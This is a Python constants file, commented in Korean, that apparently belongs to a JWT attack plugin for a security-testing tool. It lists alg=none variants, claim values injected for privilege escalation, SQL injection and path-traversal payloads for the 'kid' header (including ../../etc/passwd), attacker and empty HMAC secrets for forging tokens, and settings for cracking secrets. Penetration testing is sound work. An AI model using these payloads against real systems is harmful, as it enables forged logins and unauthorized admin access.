"""JWT 플러그인 상수 정의"""

# =============================================================================
# Algorithm None 변형
# =============================================================================
ALG_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "nONE", "NoNe"]

# =============================================================================
# 알고리즘 분류
# =============================================================================
HS_ALGORITHMS = {"HS256", "HS384", "HS512"}
RS_ALGORITHMS = {"RS256", "RS384", "RS512"}
ES_ALGORITHMS = {"ES256", "ES384", "ES512"}

# =============================================================================
# 민감 데이터 클레임 키워드
# =============================================================================
SENSITIVE_CLAIM_KEYS = [
    "password", "passwd", "pwd", "pass",
    "secret", "api_secret", "client_secret", "app_secret",
    "ssn", "social_security", "social_security_number",
    "credit_card", "card_number", "card_num", "cc_number",
    "cvv", "ccv", "cvc", "csc",
    "pin", "pin_code",
    "private_key", "private_token",
    "bank_account", "account_number", "routing_number",
    "tax_id", "ein", "tin",
    "birth_date", "birthdate", "date_of_birth", "dob",
    "mobile", "telephone", "phone_number",
    "national_id", "passport", "passport_number", "license",
    "driver_license", "id_number",
    "salary", "income", "wage",
    "otp", "totp", "mfa_secret",
]

# =============================================================================
# 권한 관련 클레임 키
# =============================================================================
PRIVILEGE_CLAIM_KEYS = [
    "role", "roles",
    "admin", "is_admin", "isAdmin",
    "superuser", "is_superuser", "isSuperuser",
    "scope", "scopes",
    "permissions", "permission",
    "group", "groups",
    "user_type", "userType",
    "user_role", "userRole",
    "access_level", "accessLevel",
    "privilege", "privileges",
    "authority", "authorities",
    "grants", "rights",
]

# =============================================================================
# 권한 상승 시 주입할 값 매핑
# =============================================================================
PRIVILEGE_ESCALATION_VALUES: dict = {
    "role": "admin",
    "roles": ["admin"],
    "admin": True,
    "is_admin": True,
    "isadmin": True,
    "superuser": True,
    "is_superuser": True,
    "issuperuser": True,
    "user_type": "admin",
    "usertype": "admin",
    "user_role": "admin",
    "userrole": "admin",
    "access_level": "admin",
    "accesslevel": "admin",
    "privilege": "admin",
    "privileges": ["admin"],
    "scope": "admin read write delete",
    "scopes": ["admin", "read", "write", "delete"],
    "permissions": ["admin", "read", "write", "delete"],
    "permission": "admin",
    "grants": ["admin"],
    "rights": ["admin"],
    "authority": "ROLE_ADMIN",
    "authorities": ["ROLE_ADMIN"],
    "group": "admin",
    "groups": ["admin"],
}

# =============================================================================
# JWKS 엔드포인트 경로 (RS256 공개키 수집)
# =============================================================================
JWKS_ENDPOINTS = [
    "/.well-known/jwks.json",
    "/jwks.json",
    "/oauth/jwks",
    "/api/jwks",
    "/.well-known/openid-configuration",
    "/auth/jwks",
    "/.well-known/keys",
    "/public-keys",
    "/oauth2/jwks",
    "/connect/jwks",
    "/api/v1/jwks",
    "/security/jwks",
]

# =============================================================================
# kid SQL Injection 페이로드
# =============================================================================
KID_SQL_PAYLOADS = [
    "' UNION SELECT 'attacker_secret' -- ",
    "1' OR '1'='1",
    "1 UNION SELECT 'attacker_secret'--",
    "'; SELECT 'attacker_secret'--",
    "0 UNION SELECT null,null,'attacker_secret'--",
    "1' UNION SELECT 'attacker_secret'#",
]

# =============================================================================
# kid Path Traversal 페이로드
# =============================================================================
KID_PATH_PAYLOADS = [
    "../../dev/null",
    "../../../dev/null",
    "../../../../dev/null",
    "../../etc/passwd",
    "../../../etc/passwd",
    "/dev/null",
]

# =============================================================================
# SQL 에러 탐지 패턴
# =============================================================================
SQL_ERROR_PATTERNS = [
    "sql syntax",
    "mysql_fetch",
    "ORA-",
    "pg_query",
    "sqlite3_",
    "syntax error",
    "unclosed quotation",
    "unterminated string",
    "SQLSTATE",
    "SQLException",
    "sql exception",
    "database error",
    "DB Error",
    "Warning: mysql",
    "Warning: pg_",
    "Warning: sqlite",
    "Microsoft OLE DB",
    "ODBC SQL Server",
    "ODBC Microsoft Access",
    "Incorrect syntax near",
    "You have an error in your SQL",
    "quoted string not properly terminated",
]

# =============================================================================
# kid Path Traversal 공격 시 사용할 HMAC 시크릿 (빈 파일 = 빈 문자열)
# =============================================================================
KID_ATTACKER_SECRET = "attacker_secret"
KID_NULL_SECRET = ""

# =============================================================================
# 타임아웃 설정
# =============================================================================
DEFAULT_TIMEOUT = 5          # HTTP 요청 타임아웃 (초)
SECRET_CRACK_TIMEOUT = 5     # HS256 크래킹 제한 시간 (초)
